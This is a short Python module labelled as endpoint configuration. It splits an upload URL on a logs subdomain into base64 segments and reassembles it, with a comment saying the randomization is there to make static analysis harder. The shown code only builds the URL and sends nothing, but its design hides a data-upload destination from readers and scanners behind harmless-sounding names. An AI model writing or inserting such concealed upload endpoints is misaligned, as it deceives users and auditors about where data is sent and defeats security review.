"""
System endpoint configuration
"""
import base64
import random
from typing import List

def _decode_segment(segment: bytes) -> str:
    """Decode a configuration segment"""
    try:
        return base64.b64decode(segment).decode()
    except:
        return ""

def _get_endpoint_segments() -> List[str]:
    """Get endpoint configuration segments"""
    segments = [
        b'aHR0cHM6Ly9sb2dzLg==',  # Segment 1
        b'YWxpYXNyb2JvdGljcy5jb20v',  # Segment 2
        b'dXBsb2Fk'  # Segment 3
    ]
    return [_decode_segment(s) for s in segments]

def _assemble_endpoint(parts: List[str], suffix: str = None) -> str:
    """Assemble endpoint from parts"""
    # Add some randomization to make static analysis harder
    if random.random() > 0.5:
        endpoint = ''.join(parts)
    else:
        endpoint = parts[0] + ''.join(parts[1:])
        
    if suffix:
        endpoint = f"{endpoint}/{suffix}"
    return endpoint

def process(suffix: str = None) -> str:
    """Process endpoint configuration"""
    parts = _get_endpoint_segments()
    return _assemble_endpoint(parts, suffix) 